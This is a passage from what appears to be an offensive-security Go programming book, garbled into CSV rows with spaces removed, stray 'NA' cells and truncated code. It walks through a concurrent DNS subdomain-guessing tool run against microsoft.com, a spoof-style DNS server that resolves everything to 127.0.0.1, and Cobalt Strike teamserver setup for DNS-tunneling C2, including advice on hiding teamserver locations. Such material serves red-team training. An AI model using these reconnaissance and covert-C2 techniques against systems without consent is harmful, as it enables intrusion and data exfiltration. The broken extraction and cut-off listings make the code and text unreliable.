"createusefultools.Inthissection,you’llcreateasubdomain-",NA,NA
guessingutility.Guessingatarget’ssubdomainsandother ,NA,NA
"DNSrecordsisafoundationalstepinreconnaissance,because ",NA,NA
"themoresubdomainsyouknow,themoreyoucanattemptto ",NA,NA
attack.You’llsupplyourutilityacandidatewordlist(a ,NA,NA
dictionaryfile)touseforguessingsubdomains.,NA,NA
"WithDNS,youcansendrequestsasfastasyouroperating ",NA,NA
systemcanhandletheprocessingofpacketdata.Whilethe ,NA,NA
"languageandruntimearen’tgoingtobecomeabottleneck,the ",NA,NA
destinationserverwill.Controllingtheconcurrencyofyour,NA,NA
"programwillbeimportanthere,justasithasbeeninprevious ",NA,NA
chapters.,NA,NA
"First,createanewdirectoryinyour",GOPATH,NA
called,NA,NA
subdomain_guesser,NA,NA
",andcreateanewfile",NA,NA
main.go,NA,NA
".Next, ",NA,NA
"whenyoufirststartwritinganewtool,youmustdecidewhich ",NA,NA
argumentstheprogramwilltake.Thissubdomain-guessing ,NA,NA
"programwilltakeseveralarguments,includingthetarget ",NA,NA
"domain,thefilenamecontainingsubdomainstoguess,the ",NA,NA
"destinationDNSservertouse,andthenumberofworkersto ",NA,NA
launch.Goprovidesausefulpackageforparsingcommand ,NA,NA
lineoptionscalled,flag,NA
thatyou’llusetohandleyourcommand,NA,NA
linearguments.Althoughwedon’tusethe,flag,NA
packageacross,NA,NA
"allofourcodeexamples,we’veoptedtouseitinthiscaseto ",NA,NA
"demonstratemorerobust,elegantargumentparsing.",NA,NA
Listing5,NA,NA
-3,NA,NA
showsourargument-parsingcode.,"packagemain
  
  
 import(
  
 ""flag""
  
 )
  
  
 funcmain(){
  
 var(
  
 flDomain=flag.String(""domain"","""",""Thedomaintoperformguessing 
 against."")❶
  
 flWordlist=flag.String(""wordlist"","""",""Thewordlisttouseforguessing."") 
 flWorkerCount=flag.Int(""c"",100,""Theamountofworkerstouse."")❷flServerAdd
 r=flag.String(""server"",""8.8.8.8:53"",""TheDNSservertouse."")
  
  
 ) 
  
 flag.Parse()❸
  
 }
  
 Listing5-3:Buildingasubdomainguesser(
 /ch-5/subdomain_guesser/main.go
 )",NA
"First,thecodelinedeclaringthe",flDomain,NA
variable❶takesa ,String,NA
argumentanddeclaresanemptystringdefaultvaluefor ,NA,NA
whatwillbeparsedasthe,domain,NA
option.Thenextpertinentline ,NA,NA
ofcodeisthe,flWorkerCount,NA
variabledeclaration❷.Youneedto ,NA,NA
providean,Integer,NA
valueasthe,c,NA
commandlineoption.Inthis ,NA,NA
"case,setthisto100defaultworkers.Butthisvalueisprobably ",NA,NA
"tooconservative,sofeelfreetoincreasethenumberwhen ",NA,NA
"testing.Finally,acallto",flag.Parse(),NA
❸populatesyourvariables ,NA,NA
byusingtheprovidedinputfromtheuser.,"NOTE
  
 YoumayhavenoticedthattheexampleisgoingagainstUnixlawinthatit 
 hasdefinedoptionalargumentsthataren’toptional.Pleasefeelfreetouse 
 os.Args
 here.Wejustfinditeasierandfastertolettheflagpackagedoallthe work.",NA
"Ifyoutrytobuildthisprogram,youshouldreceiveanerror ",NA,NA
aboutunusedvariables.Addthefollowingcodeimmediately ,NA,NA
afteryourcallto,flag.Parse(),NA
.Thisadditionprintsthevariablesto ,NA,NA
"stdoutalongwithcode,ensuringthattheuserprovided",-domain,NA
and,-wordlist,NA
:,"if*flDomain==""""||*flWordlist==""""{
  
  
 fmt.Println(""-domainand-wordlistarerequired"")
  
  
 os.Exit(1)
  
  
 }
  
  
 fmt.Println(*flWorkerCount,*flServerAddr)",NA
Toallowyourtooltoreportwhichnameswereresolvable ,NA,NA
"alongwiththeirrespectiveIPaddresses,you’llcreatea",struct,NA
typetostorethisinformation.Defineitabovethe,main(),NA
function:,typeresultstruct{,NA
You’llquerytwomainrecordtypes—AandCNAME—for ,NA,NA
thistool.You’llperformeachqueryinaseparatefunction.It’s ,NA,NA
agoodideatokeepyourfunctionsassmallaspossibleandto,NA,NA
haveeachperformonethingwell.Thisstyleofdevelopment ,NA,NA
allowsyoutowritesmallertestsinthefuture.,NA,NA
QueryingAandCNAMERecords,NA,NA
You’llcreatetwofunctionstoperformqueries:oneforA,NA,NA
recordsandtheotherforCNAMErecords.Bothfunctions ,NA,NA
acceptaFQDNasthefirstargumentandtheDNSserver ,NA,NA
addressasthesecond.Eachshouldreturnasliceofstringsand ,NA,NA
anerror.Addthesefunctionstothecodeyoubegandefining ,NA,NA
in,NA,NA
Listing5-3,NA,NA
.Thesefunctionsshouldbedefinedoutside,main(),NA
.,"funclookupA(fqdn,serverAddrstring)([]string,error){
  
 varmdns.Msg 
  
 varips[]string 
  
 m.SetQuestion(dns.Fqdn(fqdn),dns.TypeA) 
  
 in,err:=dns.Exchange(&m,serverAddr) 
  
 iferr!=nil{ 
  
 returnips,err 
  
 } 
  
 iflen(in.Answer)<1{ 
  
 returnips,errors.New(""noanswer"") 
  
 } 
  
 for_,answer:=rangein.Answer{ 
  
 ifa,ok:=answer.(*dns.A);ok{ 
  
 ips=append(ips,a.A.String()) 
  
 } 
  
 }",NA
Thiscodeshouldlookfamiliarbecauseit’snearlyidentical ,NA,NA
tothecodeyouwroteinthefirstsectionofthischapter.The,NA,NA
"firstfunction,",lookupA,NA
",returnsalistofIPaddresses,and",lookupCNAME,NA
returnsalistofhostnames.,NA,NA
CNAME,NA,NA
",or",NA,NA
canonicalname,NA,NA
",recordspointoneFQDNto",NA,NA
"anotheronethatservesasanaliasforthefirst.Forinstance, ",NA,NA
saytheownerofthe,NA,NA
example.com,NA,NA
organizationwantstohosta ,NA,NA
WordPresssitebyusingaWordPresshostingservice.That ,NA,NA
servicemayhavehundredsofIPaddressesforbalancingallof ,NA,NA
"theirusers’sites,soprovidinganindividualsite’sIPaddress",NA,NA
wouldbeinfeasible.TheWordPresshostingservicecan ,NA,NA
insteadprovideacanonicalname(aCNAME)thattheowner ,NA,NA
of,NA,NA
example.com,NA,NA
canreference.So,NA,NA
www.example.com,NA,NA
might ,NA,NA
haveaCNAMEpointingto,NA,NA
someserver.hostingcompany.org,NA,NA
",",NA,NA
whichinturnhasanArecordpointingtoanIPaddress.This ,NA,NA
allowstheownerof,NA,NA
example.com,NA,NA
tohosttheirsiteonaserver ,NA,NA
forwhichtheyhavenoIPinformation.,NA,NA
Oftenthismeansyou’llneedtofollowthetrailof ,NA,NA
CNAMEStoeventuallyendupatavalidArecord.Wesay ,NA,NA
trail,NA,NA
becauseyoucanhaveanendlesschainofCNAMES. ,NA,NA
Placethefunctioninthefollowingcodeoutside,main(),NA
tosee,NA,NA
howyoucanusethetrailofCNAMEStotrackdownthevalid ,NA,NA
Arecord:,"funclookup(fqdn,serverAddrstring)[]result{
  
 ❶varresults[]result
  
 ❷varcfqdn=fqdn//Don'tmodifytheoriginal.
  
 for{
  
 ❸cnames,err:=lookupCNAME(cfqdn,serverAddr)
 ❹iferr==nil&&len(cnames)>0{
  
  
 ❺cfqdn=cnames[0]
  
  
 ❻continue//WehavetoprocessthenextCNAME.
  
 }
  
 ❼ips,err:=lookupA(cfqdn,serverAddr)
  
 iferr!=nil{
  
 break//TherearenoArecordsforthishostname.
  
 }
  
  
 ❽for_,ip:=rangeips{ 
  
 results=append(results,result{IPAddress:ip,Hostname:fqdn})
  
  
 }
  
  
 ❾break//Wehaveprocessedalltheresults.
  
 }
  
 returnresults 
  
 }",NA
"First,defineaslicetostoreresults❶.Next,createacopy ",NA,NA
"oftheFQDNpassedinasthefirstargument❷,notonlyso ",NA,NA
"youdon’tlosetheoriginalFQDNthatwasguessed,butalso ",NA,NA
soyoucanuseitonthefirstqueryattempt.Afterstartingan ,NA,NA
"infiniteloop,trytoresolvetheCNAMEsfortheFQDN❸.If",NA,NA
"noerrorsoccurandatleastoneCNAMEisreturned❹,set ",cfqdn,NA
"totheCNAMEreturned❺,using",continue,NA
toreturntothe ,NA,NA
beginningoftheloop❻.Thisprocessallowsyoutofollow ,NA,NA
"thetrailofCNAMESuntilafailureoccurs.Ifthere’safailure, ",NA,NA
"whichindicatesthatyou’vereachedtheendofthechain,you ",NA,NA
"canthenlookforArecords❼;butifthere’sanerror,which ",NA,NA
"indicatessomethingwentwrongwiththerecordlookup,then ",NA,NA
"youleavetheloopearly.IftherearevalidArecords,append ",NA,NA
eachoftheIPaddressesreturnedtoyour,results,NA
slice❽and ,NA,NA
"breakoutoftheloop❾.Finally,returnthe",results,NA
tothecaller. ,NA,NA
Ourlogicassociatedwiththenameresolutionseemssound. ,NA,NA
"However,youhaven’taccountedforperformance.Let’smake ",NA,NA
ourexamplegoroutine-friendlysoyoucanaddconcurrency.,NA,NA
PassingtoaWorkerFunction,NA,NA
You’llcreateapoolofgoroutinesthatpassworktoa,NA,NA
worker ,NA,NA
function,NA,NA
",whichperformsaunitofwork.You’lldothisby ",NA,NA
usingchannelstocoordinateworkdistributionandthe ,NA,NA
gatheringofresults.Recallthatyoudidsomethingsimilarin ,NA,NA
Chapter2,NA,NA
",whenyoubuiltaconcurrentportscanner.",NA,NA
Continuetoexpandthecodefrom,NA,NA
Listing5-3,NA,NA
".First,create ",NA,NA
the,worker(),NA
functionandplaceitoutside,main(),NA
.Thisfunction,NA,NA
takesthreechannelarguments:achannelfortheworkerto ,NA,NA
"signalwhetherithasclosed,achannelofdomainsonwhichto ",NA,NA
"receivework,andachannelonwhichtosendresults.The ",NA,NA
functionwillneedafinalstringargumenttospecifytheDNS ,NA,NA
servertouse.Thefollowingcodeshowsanexampleofour ,worker(),NA
function:,typeemptystruct{}❶,NA
Beforeintroducingthe,worker(),NA
"function,firstdefinethetype ",empty,NA
totrackwhentheworkerfinishes❶.Thisisa,struct,NA
with ,NA,NA
nofields;youuseanempty,struct,NA
becauseit’s0bytesinsize ,NA,NA
"andwillhavelittleimpactoroverheadwhenused.Then,inthe ",worker(),NA
"function,loopoverthedomainschannel❷,whichis ",NA,NA
usedtopassinFQDNs.Aftergettingresultsfromyour,lookup(),NA
"functionandcheckingtoensurethereisatleastoneresult, ",NA,NA
sendtheresultsonthe,gather,NA
"channel❸,whichaccumulatesthe ",NA,NA
resultsbackin,main(),NA
.Aftertheworkloopexitsbecausethe ,NA,NA
"channelhasbeenclosed,an",empty,NA
structissentonthe,tracker,NA
channel❹tosignalthecallerthatallworkhasbeen ,NA,NA
completed.Sendingtheempty,struct,NA
onthetrackerchannelis ,NA,NA
"animportantlaststep.Ifyoudon’tdothis,you’llhavearace ",NA,NA
"condition,becausethecallermayexitbeforethe",gather,NA
channel ,NA,NA
receivesresults.,NA,NA
"Sincealloftheprerequisitestructureissetupatthispoint, ",NA,NA
let’srefocusourattentionbackto,main(),NA
tocompletethe ,NA,NA
programwebeganin,NA,NA
Listing5-3,NA,NA
.Definesomevariablesthat ,NA,NA
willholdtheresultsandthechannelsthatwillbepassedto ,worker(),NA
.Thenappendthefollowingcodeinto,main(),NA
:,varresults[]result,NA
Createthe,fqdns,NA
channelasabufferedchannelbyusingthe,NA,NA
numberofworkersprovidedbytheuser.Thisallowsthe,NA,NA
"workerstostartslightlyfaster,asthechannelcanholdmore",NA,NA
thanasinglemessagebeforeblockingthesender.,NA,NA
CreatingaScannerwithbufio,NA,NA
"Next,openthefileprovidedbytheusertoconsumeasaword",NA,NA
"list.Withthefileopen,createanew",scanner,NA
byusingthe,bufio,NA
package.Thescannerallowsyoutoreadthefileonelineata,NA,NA
time.Appendthefollowingcodeinto,main(),NA
:,"fh,err:=os.Open(*flWordlist)
  
  
 iferr!=nil{
  
  
 panic(err)
  
  
 }
  
  
 deferfh.Close()
  
  
 scanner:=bufio.NewScanner(fh)",NA
Thebuilt-infunction,panic(),NA
isusedhereiftheerrorreturned,NA,NA
isnot,nil,NA
.Whenyou’rewritingapackageorprogramthat,NA,NA
"otherswilluse,youshouldconsiderpresentingthis",NA,NA
informationinacleanerformat.,NA,NA
You’llusethenew,scanner,NA
tograbalineoftextfromthe,NA,NA
suppliedwordlistandcreateaFQDNbycombiningthetext,NA,NA
withthedomaintheuserprovides.You’llsendtheresulton,NA,NA
the,fqdns,NA
channel.Butyoumuststarttheworkersfirst.The,NA,NA
orderofthisisimportant.Ifyouweretosendyourworkdown,NA,NA
the,fqdns,NA
"channelwithoutstartingtheworkers,thebuffered",NA,NA
"channelwouldeventuallybecomefull,andyourproducers ",NA,NA
wouldblock.You’lladdthefollowingcodetoyour,main(),NA
"function.Itspurposeistostarttheworkergoroutines,read ",NA,NA
"yourinputfile,andsendworkonyour",fqdns,NA
channel.,"❶fori:=0;i<*flWorkerCount;i++{ 
  
 goworker(tracker,fqdns,gather,*flServerAddr)
  
  
 }
  
  
 ❷forscanner.Scan(){ 
  
 fqdns<-fmt.Sprintf(""%s.%s"",scanner.Text()❸,*flDomain)
  
 }",NA
Creatingtheworkers❶byusingthispatternshouldlook ,NA,NA
similartowhatyoudidwhenbuildingyourconcurrentport ,NA,NA
scanner:youuseda,for,NA
loopuntilyoureachedthenumber,NA,NA
"providedbytheuser.Tograbeachlineinthefile,",scanner.Scan(),NA
isusedinaloop❷.Thisloopendswhentherearenomore ,NA,NA
linestoreadinthefile.Togetastringrepresentationofthe ,NA,NA
"textfromthescannedline,use",scanner.Text(),NA
❸.,NA,NA
Theworkhasbeenlaunched!Takeasecondtobaskin ,NA,NA
"greatness.Beforereadingthenextcode,thinkaboutwhereyou ",NA,NA
areintheprogramandwhatyou’vealreadydoneinthisbook.,NA,NA
Trytocompletethisprogramandthencontinuetothenext ,NA,NA
"section,wherewe’llwalkyouthroughtherest.",NA,NA
GatheringandDisplayingtheResults,NA,NA
"Tofinishup,firststartananonymousgoroutinethatwill ",NA,NA
gathertheresultsfromtheworkers.Appendthefollowing ,NA,NA
codeinto,"main():
  
 gofunc(){
  
  
 forr:=rangegather{",NA
Byloopingoverthe,gather,NA
"channel,youappendthereceived ",NA,NA
resultsontothe,results,NA
slice❶.Sinceyou’reappendingaslice ,NA,NA
"toanotherslice,youmustusethe",...,NA
syntax❷.Afteryouclose,NA,NA
the,gather,NA
"channelandtheloopends,sendanempty",struct,NA
tothe ,NA,NA
trackerchannelasyoudidearlier❸.Thisisdonetopreventa ,NA,NA
raceconditionincase,append(),NA
doesn’tfinishbythetimeyou,NA,NA
eventuallypresenttheresultstotheuser.,NA,NA
Allthat’sleftisclosingthechannelsandpresentingthe,NA,NA
results.Includethefollowingcodeatthebottomof,main(),NA
in,NA,NA
ordertoclosethechannelsandpresenttheresultstotheuser:,"❶close(fqdns)
  
 ❷fori:=0;i<*flWorkerCount;i++{
  
 <-tracker
  
  
 }
  
 ❸close(gather
 )
  
 ❹<-tracker",NA
Thefirstchannelthatcanbeclosedis,fqdns,NA
❶because,NA,NA
"you’vealreadysentalltheworkonthischannel.Next,you",NA,NA
needtoreceiveonthe,tracker,NA
channelonetimeforeachofthe ,NA,NA
"workers❷,allowingtheworkerstosignalthattheyexited ",NA,NA
"completely.Withalloftheworkersaccountedfor,youcan ",NA,NA
closethe,gather,NA
channel❸becausetherearenomoreresultsto,NA,NA
"receive.Finally,receiveonemoretimeonthe",tracker,NA
channelto ,NA,NA
allowthegatheringgoroutinetofinishcompletely❹.,NA,NA
Theresultsaren’tyetpresentedtotheuser.Let’sfixthat.If,NA,NA
"youwantedto,youcouldeasilyloopoverthe",results,NA
sliceand,NA,NA
printthe,Hostname,NA
and,IPAddress,NA
fieldsbyusing,fmt.Printf(),NA
.We,NA,NA
"prefer,instead,touseoneofGo’sseveralgreatbuilt-in ",NA,NA
packagesforpresentingdata;,tabwriter,NA
isoneofourfavorites.It,NA,NA
"allowsyoutopresentdatainnice,evencolumnsbrokenupby ",NA,NA
tabs.Addthefollowingcodetotheendof,main(),NA
touse,tabwriter,NA
toprintyourresults:,"w:=tabwriter.NewWriter(os.Stdout,0,8,4,'',0)
  
  
 for_,r:=rangeresults{
  
  
 fmt.Fprintf(w,""%s\t%s\n"",r.Hostname,r.IPAddress)
  
  
 }
  
  
 w.Flush()",NA
Listing5-4,NA,NA
showstheprograminitsentirety.,"Packagemain
  
 import( 
  
 ""bufio"" 
  
 ""errors"" 
  
 ""flag"" 
  
 ""fmt"" 
  
 ""os"" 
  
 ""text/tabwriter""
  
 ""github.com/miekg/dns"" 
  
 )
  
 funclookupA(fqdn,serverAddrstring)([]string,error){ 
 varmdns.Msg 
  
 varips[]string 
  
 m.SetQuestion(dns.Fqdn(fqdn),dns.TypeA) 
  
 in,err:=dns.Exchange(&m,serverAddr) 
  
 iferr!=nil{ 
  
 returnips,err",NA
Yoursubdomain-guessingprogramiscomplete!You ,NA,NA
shouldnowbeabletobuildandexecuteyourshinynew,NA,NA
subdomain-guessingtool.Tryitwithwordlistsordictionary ,NA,NA
filesinopensourcerepositories(youcanfindplentywitha ,NA,NA
Googlesearch).Playaroundwiththenumberofworkers;you ,NA,NA
"mayfindthatifyougotoofast,you’llgetvaryingresults.",NA,NA
Here’sarunfromtheauthors’systemusing100workers:,"$
 wc-lnamelist.txt
  
 1909namelist.txt 
  
 $
 time./subdomain_guesser-domainmicrosoft.com-wordlistnamelist.txt-
 c 1000 
  
 ajax.microsoft.com72.21.81.200 
  
 buy.microsoft.com157.56.65.82 
  
 news.microsoft.com192.230.67.121 
  
 applications.microsoft.com168.62.185.179 
  
 sc.microsoft.com157.55.99.181 
  
 open.microsoft.com23.99.65.65 
  
 ra.microsoft.com131.107.98.31 
  
 ris.microsoft.com213.199.139.250 
  
 smtp.microsoft.com205.248.106.64 
  
 wallet.microsoft.com40.86.87.229 
  
 jp.microsoft.com134.170.185.46 
  
 ftp.microsoft.com134.170.188.232
  
 develop.microsoft.com104.43.195.251",NA
You’llseethattheoutputshowsseveralFQDNsandtheir ,NA,NA
IPaddresses.Wewereabletoguessthesubdomainvaluesfor ,NA,NA
eachresultbasedoffthewordlistprovidedasaninputfile.,NA,NA
Nowthatyou’vebuiltyourownsubdomain-guessingtool ,NA,NA
andlearnedhowtoresolvehostnamesandIPaddressesto ,NA,NA
"enumeratedifferentDNSrecords,you’rereadytowriteyour ",NA,NA
ownDNSserverandproxy.,NA,NA
WRITINGDNSSERVERS,NA,NA
"AsYodasaid,“Alwaystwothereare,nomore,noless.”Of ",NA,NA
"course,hewastalkingabouttheclient-serverrelationship,and ",NA,NA
"sinceyou’reamasterofclients,nowisthetimetobecomea ",NA,NA
"masterofservers.Inthissection,you’llusetheGoDNS ",NA,NA
packagetowriteabasicserverandaproxy.YoucanuseDNS ,NA,NA
"serversforseveralnefariousactivities,includingbutnot ",NA,NA
limitedtotunnelingoutofrestrictivenetworksandconducting ,NA,NA
spoofingattacksbyusingfakewirelessaccesspoints.,NA,NA
"Beforeyoubegin,you’llneedtosetupalabenvironment.",NA,NA
Thislabenvironmentwillallowyoutosimulaterealistic ,NA,NA
scenarioswithouthavingtoownlegitimatedomainsanduse ,NA,NA
"costlyinfrastructure,butifyou’dliketoregisterdomainsand ",NA,NA
"usearealserver,pleasefeelfreetodoso.",NA,NA
LabSetupandServerIntroduction,NA,NA
Yourlabconsistsoftwovirtualmachines(VMs):aMicrosoft ,NA,NA
WindowsVMtoactasclientandanUbuntuVMtoactas ,NA,NA
server.ThisexampleusesVMWareWorkstationalongwith,NA,NA
Bridgednetworkmodeforeachmachine;youcanusea ,NA,NA
"privatevirtualnetwork,butmakesurethatbothmachinesare ",NA,NA
onthesamenetwork.YourserverwillruntwoCobaltStrike ,NA,NA
DockerinstancesbuiltfromtheofficialJavaDockerimage ,NA,NA
(JavaisaprerequisiteforCobaltStrike).,NA,NA
Figure5-1,NA,NA
shows ,NA,NA
whatyourlabwilllooklike.,Figure5-1:ThelabsetupforcreatingyourDNSserver,NA
"First,createtheUbuntuVM.Todothis,we’lluseversion ",NA,NA
"16.04.1LTS.Nospecialconsiderationsneedtobemade,but ",NA,NA
youshouldconfiguretheVMwithatleast4gigabytesof ,NA,NA
memoryandtwoCPUs.YoucanuseanexistingVMorhostif ,NA,NA
"youhaveone.Aftertheoperatingsystemhasbeeninstalled, ",NA,NA
you’llwanttoinstallaGodevelopmentenvironment(see ,NA,NA
Chapter1,NA,NA
).,NA,NA
"Onceyou’vecreatedtheUbuntuVM,installa ",NA,NA
virtualizationcontainerutilitycalled,NA,NA
Docker,NA,NA
.Intheproxy ,NA,NA
"sectionofthischapter,you’lluseDockertorunmultiple ",NA,NA
"instancesofCobaltStrike.ToinstallDocker,runthefollowing ",NA,NA
inyourterminalwindow:,NA,NA
"Afterinstalling,logoutandlogbackintoyoursystem.",NA,NA
"Next,verifythatDockerhasbeeninstalledbyrunningthe",NA,NA
followingcommand:,"$
 dockerversion
  
  
 Client:
  
  
 Version:1.13.1
  
  
 APIversion:1.26
  
  
 Goversion:go1.7.5
  
  
 Gitcommit:092cba3
  
  
 Built:WedFeb506:50:142020
  
  
 OS/Arch:linux/amd64",NA
"WithDockerinstalled,usethefollowingcommandto",NA,NA
downloadaJavaimage.Thiscommandpullsdownthebase,NA,NA
DockerJavaimagebutdoesn’tcreateanycontainers.You’re,NA,NA
doingthistoprepareforyourCobaltStrikebuildsshortly.,"$
 dockerpulljava",NA
"Finally,youneedtoensurethat",dnsmasq,NA
"isn’trunning,",NA,NA
"becauseitlistensonport53.Otherwise,yourownDNS",NA,NA
"serverswon’tbeabletooperate,sincethey’reexpectedtouse",NA,NA
thesameport.KilltheprocessbyIDifit’srunning:,NA,NA
"NowcreateaWindowsVM.Again,youcanusean ",NA,NA
existingmachineifavailable.Youdon’tneedanyspecial ,NA,NA
settings;minimalsettingswilldo.Oncethesystemis ,NA,NA
"functional,settheDNSservertotheIPaddressoftheUbuntu ",NA,NA
system.,NA,NA
TotestyourlabsetupandtointroduceyoutowritingDNS ,NA,NA
"servers,startbywritingabasicserverthatreturnsonlyA ",NA,NA
records.Inyour,GOPATH,NA
"ontheUbuntusystem,createanew",NA,NA
directorycalled,NA,NA
github.com/blackhat-go/bhg/ch-,NA,NA
5/a_server ,NA,NA
andafiletoholdyour,NA,NA
main.go,NA,NA
code.,NA,NA
Listing5-,NA,NA
5,NA,NA
showsthe entirecodeforcreatingasimpleDNSserver.,"packagemain
  
 import( 
  
 ""log"" 
  
 ""net""
  
 ""github.com/miekg/dns"" 
  
 )
  
 funcmain(){
  
 ❶dns.HandleFunc(""."",func(wdns.ResponseWriter,req*dns.Msg){
   
 ❷varrespdns.Msg 
  
 resp.SetReply(req)
  
  
 for_,q:=rangereq.Question{
  
 ❸a:=dns.A{ 
  
 Hdr:dns.RR_Header{
  
 Name:q.Name, 
  
 Rrtype:dns.TypeA, 
  
 Class:dns.ClassINET,
  
 Ttl:0,",NA
Theservercodestartswithacallto,HandleFunc(),NA
❶;itlooks ,NA,NA
alotlikethe,net/http,NA
package.Thefunction’sfirstargumentisa ,NA,NA
querypatterntomatch.You’llusethispatterntoindicateto ,NA,NA
theDNSserverswhichrequestswillbehandledbythe ,NA,NA
"suppliedfunction.Byusingaperiod,you’retellingtheserver ",NA,NA
thatthefunctionyousupplyinthesecondargumentwill ,NA,NA
handleallrequests.,NA,NA
Thenextargumentpassedto,HandleFunc(),NA
isafunction ,NA,NA
containingthelogicforthehandler.Thisfunctionreceivestwo ,NA,NA
arguments:a,ResponseWriter,NA
andtherequestitself.Insidethe ,NA,NA
"handler,youstartbycreatinganewmessageandsettingthe ",NA,NA
"reply❷.Next,youcreateananswerforeachquestion,using ",NA,NA
"anArecord,whichimplementsthe",RR,NA
interface.Thisportion ,NA,NA
willvarydependingonthetypeofansweryou’relookingfor❸.,NA,NA
ThepointertotheArecordisappendedtotheresponse’s ,Answer,NA
fieldbyusing,append(),NA
"❹.Withtheresponsecomplete, ",NA,NA
youcanwritethismessagetothecallingclientbyusing ,w.WriteMsg(),NA
"❺.Finally,tostarttheserver,",ListenAndServe(),NA
is ,NA,NA
called❻.ThiscoderesolvesallrequeststoanIPaddressof ,NA,NA
127.0.0.1.,NA,NA
"Oncetheserveriscompiledandstarted,youcantestitby",NA,NA
using,dig,NA
.Confirmthatthehostnameforwhichyou’re,NA,NA
queryingresolvesto127.0.0.1.Thatindicatesit’sworkingas ,NA,NA
designed.,"$
 dig@localhostfacebook.com
  
  
 ;<<>>DiG9.10.3-P4-Ubuntu<<>>@localhostfacebook.com
  
 ;(1serverfound) 
  
 ;;globaloptions:+cmd 
  
 ;;Gotanswer: 
  
 ;;->>HEADER<<-opcode:QUERY,status:NOERROR,id:33594 
  
 ;;flags:qrrd;QUERY:1,ANSWER:1,AUTHORITY:0,ADDITIONAL:0
  
 ;;WARNING:recursionrequestedbutnotavailable
  
  
 ;;QUESTIONSECTION:
  
  
 ;facebook.com.INA
  
  
 ;;ANSWERSECTION:
  
  
 facebook.com.0INA127.0.0.1
  
  
 ;;Querytime:0msec
  
 ;;SERVER:127.0.0.1#53(127.0.0.1) 
  
 ;;WHEN:SatDec1913:13:45MST2020
  
 ;;MSGSIZErcvd:58",NA
Notethattheserverwillneedtobestartedwithsudoora ,NA,NA
"rootaccount,becauseitlistensonaprivilegedport—port53. ",NA,NA
"Iftheserverdoesn’tstart,youmayneedtokill",dnsmasq,NA
.,NA,NA
CreatingDNSServerandProxy,NA,NA
DNStunneling,NA,NA
",adataexfiltrationtechnique,canbeagreat ",NA,NA
waytoestablishaC2channeloutofnetworkswithrestrictive ,NA,NA
"egresscontrols.IfusinganauthoritativeDNSserver,an ",NA,NA
attackercanroutethroughanorganization’sownDNSservers ,NA,NA
andoutthroughtheinternetwithouthavingtomakeadirect ,NA,NA
"connectiontotheirowninfrastructure.Althoughslow,it’s",NA,NA
difficulttodefendagainst.Severalopensourceandproprietar,NA,NA
"y payloadsperformDNStunneling,oneofwhichisCobalt ",NA,NA
"Strike’sBeacon.Inthissection,you’llwriteyourownDNS ",NA,NA
serverandproxyandlearnhowtomultiplexDNStunneling ,NA,NA
C2payloadsbyusingCobaltStrike.,NA,NA
ConfiguringCobaltStrike,NA,NA
"Ifyou’veeverusedCobaltStrike,youmayhavenoticedthat, ",NA,NA
"bydefault,the",NA,NA
teamserver,NA,NA
"listensonport53.Becauseofthis, ",NA,NA
"andbytherecommendationofthedocumentation,onlya ",NA,NA
"singleservershouldeverberunonasystem,maintaininga ",NA,NA
one-to-oneratio.Thiscanbecomeproblematicformedium-,NA,NA
"to-largeteams.Forexample,ifyouhave20teamsconducting ",NA,NA
"offensiveengagementsagainst20separateorganizations, ",NA,NA
standingup20systemscapableofrunningtheteamserver ,NA,NA
couldbedifficult.Thisproblemisn’tuniquetoCobaltStrike ,NA,NA
"andDNS;it’sapplicabletootherprotocols,includingHTTP ",NA,NA
"payloads,suchasMetasploitMeterpreterandEmpire.",NA,NA
Althoughyoucouldestablishlistenersonavarietyof ,NA,NA
"completelyuniqueports,there’sagreaterprobabilityof ",NA,NA
egressingtrafficovercommonportssuchasTCP80and443. ,NA,NA
"Sothequestionbecomes,howcanyouandotherteamssharea ",NA,NA
singleportandroutetomultiplelisteners?Theansweriswith ,NA,NA
"aproxy,ofcourse.Backtothelab.","NOTE
  
 In real engagements, you’d want to have multiple levels of subterfuge, 
 abstraction, and forwarding to disguise the location of your teamserver. 
 This can be done using UDP and TCP forwarding through small utility 
 serversusingvarioushostingproviders.Theprimaryteamserverandproxy 
 can 
 also run on separate systems, having the teamserver cluster on a",NA
Let’sruntwoinstancesofCobaltStrike’steamserverin ,NA,NA
twoDockercontainers.Thisallowstheservertolistenonport ,NA,NA
53andletseachteamserverhavewhatwilleffectivelybetheir ,NA,NA
"ownsystemand,consequently,theirownIPstack.You’lluse ",NA,NA
Docker’sbuilt-innetworkingmechanismtomapUDPportsto ,NA,NA
"thehostfromthecontainer.Beforeyoubegin,downloadatrial ",NA,NA
versionofCobaltStrikeat,NA,NA
https://trial.cobaltstrike.com/,NA,NA
.Afte,NA,NA
"r followingthetrialsign-upinstructions,youshouldhavea ",NA,NA
fresh,NA,NA
tarball,NA,NA
inyourdownloaddirectory.You’renowreadyto ,NA,NA
starttheteamservers.,NA,NA
Executethefollowinginaterminalwindowtostartthefirst ,NA,NA
container:,"$
 dockerrun--rm
 ❶
 -it
 ❷
 -p2020:53
 ❸
 -p50051:50050
 ❹
 -v
 ❺
 fullpathto 
 cobaltstrikedownload
 :/data
 ❻
 java
 ❼
 /bin/bash
 ❽",NA
"Thiscommanddoesseveralthings.First,youtellDockerto ",NA,NA
"removethecontainerafteritexits❶,andthatyou’dliketo ",NA,NA
"interactwithitafterstarting❷.Next,youmapport2020on ",NA,NA
"yourhostsystemtoport53inthecontainer❸,andport50051 ",NA,NA
"toport50050❹.Next,youmapthedirectorycontainingthe ",NA,NA
CobaltStriketarball❺tothedatadirectoryonthecontainer,NA,NA
❻.YoucanspecifyanydirectoryyouwantandDockerwill ,NA,NA
"happilycreateitforyou.Finally,providetheimageyouwant ",NA,NA
"touse(inthiscase,Java)❼andthecommand❽you’dliketo ",NA,NA
executeonstartup.Thisshouldleaveyouwithabashshellin ,NA,NA
therunningDockercontainer.,NA,NA
"OnceinsidetheDockercontainer,starttheteamserverby ",NA,NA
executingthefollowingcommands:,"$
 cd/root
  
  
 $
 tar-zxvf/data/cobaltstrike-trial.tgz",NA
"TheIPaddressprovidedshouldbethatofyouractualVM, ",NA,NA
nottheIPaddressofthecontainer.,NA,NA
"Next,openanewterminalwindowontheUbuntuhostand ",NA,NA
changeintothedirectorycontainingtheCobaltStriketarball. ,NA,NA
ExecutethefollowingcommandstoinstallJavaandstartthe ,NA,NA
CobaltStrikeclient:,"$
 sudoadd-apt-repositoryppa:webupd8team/java
  
  
 $
 sudoaptupdate
  
  
 $
 sudoaptinstalloracle-java8-installer
  
  
 $
 tar-zxvfcobaltstrike-trial.tgz
  
  
 $
 cdcobaltstrike
  
  
 $
 ./cobaltstrike",NA
TheGUIforCobaltStrikeshouldstartup.Afterclearing ,NA,NA
